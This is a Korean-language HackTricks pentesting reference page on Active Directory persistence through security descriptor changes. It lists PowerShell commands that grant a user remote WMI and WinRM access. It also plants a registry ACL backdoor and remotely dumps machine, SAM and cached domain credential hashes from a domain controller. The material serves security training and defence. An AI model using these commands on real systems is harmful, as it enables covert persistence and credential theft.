# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL)는 보안 설명자를 설명하는 데 사용되는 형식을 정의합니다. SDDL은 DACL 및 SACL에 대해 ACE 문자열을 사용합니다: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**보안 설명자**는 **객체**가 **객체**에 대해 **가진** **권한**을 **저장**하는 데 사용됩니다. 객체의 **보안 설명자**에 **조금만 변경**을 가할 수 있다면, 특권 그룹의 구성원이 될 필요 없이 해당 객체에 대한 매우 흥미로운 권한을 얻을 수 있습니다.

따라서 이 지속성 기술은 특정 객체에 대해 필요한 모든 권한을 얻는 능력에 기반하여, 일반적으로 관리자 권한이 필요한 작업을 수행할 수 있게 해줍니다.

### Access to WMI

사용자에게 **원격 WMI 실행**에 대한 액세스를 부여할 수 있습니다 [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### WinRM 접근

**사용자에게 winrm PS 콘솔에 대한 접근 권한 부여** [**이 방법을 사용하여**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### 해시 원격 접근

**레지스트리**에 접근하고 **해시 덤프**를 생성하여 **Reg 백도어를 사용하여** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** 언제든지 **컴퓨터의 해시**, **SAM** 및 컴퓨터의 모든 **캐시된 AD** 자격 증명을 검색할 수 있습니다. 따라서, 이는 **도메인 컨트롤러 컴퓨터에 대한 일반 사용자에게 이 권한을 부여하는 데 매우 유용합니다**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
[**실버 티켓**](silver-ticket.md)를 확인하여 도메인 컨트롤러의 컴퓨터 계정 해시를 어떻게 사용할 수 있는지 알아보세요.

{{#include ../../banners/hacktricks-training.md}}
